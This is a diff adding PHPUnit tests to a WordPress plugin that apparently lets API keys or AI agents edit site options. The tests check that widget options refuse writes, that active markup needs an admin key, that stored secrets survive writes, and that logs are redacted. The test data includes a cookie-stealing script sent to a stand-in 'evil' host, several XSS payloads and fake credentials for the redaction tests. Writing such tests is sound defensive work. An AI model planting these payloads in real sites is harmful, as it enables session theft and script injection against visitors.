@@ -1172,4 +1172,165 @@ final class OptionAccessTest extends TestCase {
 		$this->assertSame( '{"mode":"live"}', get_option( 'elementor_probe' )['gw'] );
 		$this->assertSame( array( 'gw: stored serialised, submitted json; stored as submitted' ), $written->get_data()['warnings'] );
 	}
+
+	// ---------------------------------------------------------------
+	// Round 8: what renders raw is read-only; active markup needs admin;
+	// the root is an ancestor; logs redact before they truncate.
+	// ---------------------------------------------------------------
+
+	public function test_widget_and_sidebar_options_are_readable_but_never_written_through_the_option_api(): void {
+		// Round-7 P0-1: widget_text / widget_block render raw to visitors;
+		// core's KSES lives in WP_Widget::update(), which update_option()
+		// bypasses. These are managed through the widgets routes.
+		update_option( 'widget_text', array( 2 => array( 'title' => 'Hi', 'text' => 'plain' ), '_multiwidget' => 1 ) );
+		$this->assertInstanceOf( WP_REST_Response::class, $this->read( 'widget_text' ) );
+
+		foreach ( array( 'widget_text', 'widget_block', 'sidebars_widgets' ) as $option ) {
+			$refused = $this->write( $option, array( 2 => array( 'text' => '<script>fetch("//evil/?c="+document.cookie)</script>' ) ) );
+			$this->assertInstanceOf( WP_Error::class, $refused, $option );
+			$this->assertSame( 'forbidden_option', $refused->get_error_code(), $option );
+			$this->assertStringStartsWith( 'write_protected:', $refused->get_error_data()['rule'], $option );
+		}
+		$this->assertSame( 'plain', get_option( 'widget_text' )[2]['text'] );
+	}
+
+	public function test_active_markup_is_stored_only_by_an_admin_scoped_key(): void {
+		$GLOBALS['mcpwp_test_filters'] = array();
+		$designer = ( new Mcpwp_REST_Site_Settings() )->create_scoped_api_key( 'designer', array( 'read', 'write' ), 'designer' );
+		$admin    = ( new Mcpwp_REST_Site_Settings() )->create_scoped_api_key( 'admin', array( 'read', 'write', 'admin' ), 'admin' );
+
+		// The REST route table already holds the option routes to admin scope;
+		// the MCP tool path reaches the handler with the key record set. The
+		// handler's own gate is what is exercised here, so the record is set
+		// the way that path sets it (a normalised record with its scopes).
+		$write_as = function ( array $key, $value ) {
+			$controller = new Mcpwp_REST_Site_Settings();
+			$prop       = new ReflectionProperty( Mcpwp_REST_API::class, 'current_api_key_record' );
+			$prop->setAccessible( true );
+			$prop->setValue( $controller, array( 'id' => $key['id'], 'scopes' => $key['scopes'], 'role' => $key['role'], 'allow_destructive' => false ) );
+			$request = new WP_REST_Request( 'POST', '/mcpwp/v1/option', array( 'key' => 'elementor_probe', 'value' => $value ) );
+			return $controller->update_option_handler( $request );
+		};
+
+		foreach ( array( '<script>x</script>', array( 'html' => '<img src=x onerror=alert(1)>' ), '{"a":"<a href=\"javascript:alert(1)\">x</a>"}', '<iframe srcdoc="x"></iframe>' ) as $payload ) {
+			$refused = $write_as( $designer, $payload );
+			$this->assertInstanceOf( WP_Error::class, $refused );
+			$this->assertSame( 'active_markup_requires_admin', $refused->get_error_code() );
+		}
+		$this->assertFalse( get_option( 'elementor_probe' ) );
+
+		// Ordinary HTML is fine for anyone; active markup is fine for an admin.
+		$this->assertInstanceOf( WP_REST_Response::class, $write_as( $designer, array( 'footer' => '<p>Hi <b>there</b></p><a href="https://x/?r=a%2Fb">x</a>' ) ) );
+		$this->assertInstanceOf( WP_REST_Response::class, $write_as( $admin, array( 'js' => '<script>x</script>' ) ) );
+		$this->assertSame( '<script>x</script>', get_option( 'elementor_probe' )['js'] );
+	}
+
+	public function test_a_scalar_over_a_stored_encoded_string_is_refused_at_the_root_too(): void {
+		// Round-7 P0-2: the root was short-circuited past the ancestor walk.
+		foreach ( array( '{"secret_key":"sk_live_AbCdEf12345678","mode":"live"}', serialize( array( 'secret_key' => 'sk_live_AbCdEf12345678', 'mode' => 'live' ) ) ) as $stored ) { // phpcs:ignore
+			update_option( 'woocommerce_probe', $stored );
+			foreach ( array( 'disabled', '' ) as $scalar ) {
+				$refused = $this->write( 'woocommerce_probe', $scalar );
+				$this->assertInstanceOf( WP_Error::class, $refused, $scalar );
+				$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
+				$this->assertSame( array( 'secret_key' ), $refused->get_error_data()['secret_paths'] );
+				$this->assertSame( $stored, get_option( 'woocommerce_probe' ), 'Nothing was written.' );
+			}
+			$written = $this->write( 'woocommerce_probe', 'disabled', array( 'allow_secrets' => true ) );
+			$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
+			$this->assertSame( 'disabled', get_option( 'woocommerce_probe' ) );
+		}
+
+		$merged = Mcpwp_Option_Access::merge_preserving_secrets( 'k', '{"secret_key":"sk_live_AbCdEf12345678"}', 'disabled', false );
+		$this->assertSame( array( 'secret_key' ), $merged['refused'] );
+		$this->assertArrayHasKey( 'warnings', $merged );
+
+		// A structure holding only a FLAG under a secret-ish name may be replaced.
+		update_option( 'woocommerce_probe', array( 'reg' => array( 'generate_password' => 'no' ) ) );
+		$this->assertInstanceOf( WP_REST_Response::class, $this->write( 'woocommerce_probe', array( 'reg' => 'disabled' ) ) );
+		$this->assertSame( 'disabled', get_option( 'woocommerce_probe' )['reg'] );
+		update_option( 'woocommerce_probe', '{"generate_password":"no"}' );
+		$this->assertInstanceOf( WP_REST_Response::class, $this->write( 'woocommerce_probe', 'off' ) );
+	}
+
+	public function test_a_list_where_a_map_holding_a_credential_was_stored_is_a_replacement(): void {
+		// Round-7 P2-9.
+		update_option( 'elementor_probe', array( 'a' => array( 'b' => array( 'password' => 'Hunter2LiveSecret' ) ) ) );
+		$refused = $this->write( 'elementor_probe', array( 'a' => array( 'x', 'y' ) ) );
+		$this->assertSame( 'secret_write_refused', $refused->get_error_code() );
+		$this->assertSame( array( 'a.b.password' ), $refused->get_error_data()['secret_paths'] );
+
+		// {} is not a list: the credential is preserved into it.
+		$written = $this->write( 'elementor_probe', array( 'a' => array() ) );
+		$this->assertInstanceOf( WP_REST_Response::class, $written );
+		$this->assertSame( 'Hunter2LiveSecret', get_option( 'elementor_probe' )['a']['b']['password'] );
+	}
+
+	public function test_the_activity_log_redacts_before_it_truncates(): void {
+		// Round-7 P0-3: a >500-char JSON value was truncated first, so the
+		// walker could not open it and the credential was logged verbatim.
+		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
+		update_option( 'mcpwp_settings', array( 'enable_logging' => true ) );
+		update_option( 'woocommerce_probe', array( 'mode' => 'test' ) );
+
+		$big = wp_json_encode( array( 'pad' => str_repeat( 'x', 600 ), 'smtp' => array( 'pass' => 'Hunter2LivePassword' ) ) );
+		$this->write( 'woocommerce_probe', $big );
+
+		$rows = wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] );
+		$this->assertStringNotContainsString( 'Hunter2LivePassword', $rows );
+		$this->assertStringContainsString( 'truncated', $rows, 'Still truncated, after redaction.' );
+	}
+
+	public function test_a_value_wordpress_alters_on_store_is_reported_as_stored_not_as_a_failure(): void {
+		// Round-7 P1-5: the write landed (altered by sanitize_option) and
+		// the API said 500.
+		$GLOBALS['mcpwp_test_option_store_hook'] = function ( $name, $value ) {
+			return 'blogname' === $name && is_string( $value ) ? strip_tags( $value ) : $value;
+		};
+		update_option( 'blogname', 'Old');
+		$written = $this->write( 'blogname', '  My <b>Site</b>  ' );
+		unset( $GLOBALS['mcpwp_test_option_store_hook'] );
+
+		$this->assertInstanceOf( WP_REST_Response::class, $written, is_wp_error( $written ) ? $written->get_error_message() : '' );
+		$this->assertSame( 'My Site', get_option( 'blogname' ), 'Trimmed (core text key) and altered by the store.' );
+		$this->assertSame( 'My Site', $written->get_data()['value'] );
+		$this->assertNotEmpty( $written->get_data()['warnings'] );
+
+		// A value the store refuses outright is a 409, not a 500 and not a lie.
+		$GLOBALS['mcpwp_test_option_store_hook'] = function ( $name, $value ) { return 'blogname' === $name ? null : $value; };
+		$refused = $this->write( 'blogname', 'Other' );
+		unset( $GLOBALS['mcpwp_test_option_store_hook'] );
+		$this->assertInstanceOf( WP_Error::class, $refused );
+		$this->assertSame( 'update_failed', $refused->get_error_code() );
+		$this->assertSame( 409, $refused->get_error_data()['status'] );
+	}
+
+	public function test_only_option_name_shaped_keys_are_kept_in_the_log(): void {
+		// Round-7 P2-7.
+		foreach ( array( 'woocommerce_api_key', 'blogname', 'wpseo_titles', 'elementor_probe', 'my-plugin.setting' ) as $name ) {
+			$this->assertTrue( Mcpwp_Option_Access::is_option_name_shaped( $name ), $name );
+		}
+		foreach ( array( 'a1b2c3d4e5f6a1b2c3d4e5f6', '550e8400-e29b-41d4-a716-446655440000', 'AKIAIOSFODNN7EXAMPLE', 'abcdef0123456789abcdef0123456789abcdef01', 'ghp_AbCd1234EfGh5678IjKlMnOp', 'x' ) as $name ) {
+			$this->assertFalse( Mcpwp_Option_Access::is_option_name_shaped( $name ), $name );
+		}
+		$out = Mcpwp_Option_Access::redact_for_log( array( 'key' => 'a1b2c3d4e5f6a1b2c3d4e5f6', 'value' => 1 ), array() );
+		$this->assertSame( '[redacted]', $out['key'] );
+	}
+
+	public function test_every_log_uses_the_sites_redaction_key_list(): void {
+		// Round-7 P2-6: three lists that should be one.
+		update_option( 'mcpwp_settings', array( 'log_redaction_keys' => array( 'Customer_PIN' ) ) );
+		$keys = Mcpwp_Option_Access::log_redaction_keys();
+		$this->assertContains( 'customer_pin', $keys );
+		$this->assertContains( 'api_key', $keys, 'The installed defaults stay.' );
+		$this->assertContains( 'client_secret', $keys );
+
+		if ( ! class_exists( 'Mcpwp_Action_Log' ) ) {
+			require_once dirname( __DIR__ ) . '/includes/core/class-mcpwp-action-log.php';
+		}
+		$GLOBALS['mcpwp_test_wpdb_rows'] = array();
+		$log_id = Mcpwp_Action_Log::begin( 'wp_update_option', array( 'key' => 'elementor_probe', 'value' => array( 'customer_pin' => '4242' ) ), 'k1', 'site' );
+		Mcpwp_Action_Log::complete( $log_id, 1, true, '' );
+		$this->assertStringNotContainsString( '4242', wp_json_encode( $GLOBALS['mcpwp_test_wpdb_rows'] ) );
+	}
 }
